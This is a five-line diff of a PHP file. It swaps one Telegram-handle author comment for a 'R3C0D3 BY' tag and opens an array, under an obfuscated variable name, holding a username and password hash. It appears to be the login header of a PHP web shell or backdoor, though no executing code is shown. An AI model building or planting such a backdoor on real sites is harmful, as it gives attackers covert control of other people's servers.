@@ -1,5 +1,5 @@
 <?php
-// Ada butuh sesuatu tuan? https://t.me/zaynphantomhive
+// R3C0D3 BY https://t.me/zaynphantomhive
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'z4phy',
     'password' => '190b6d402db6ce02363b983178ae9bc3',
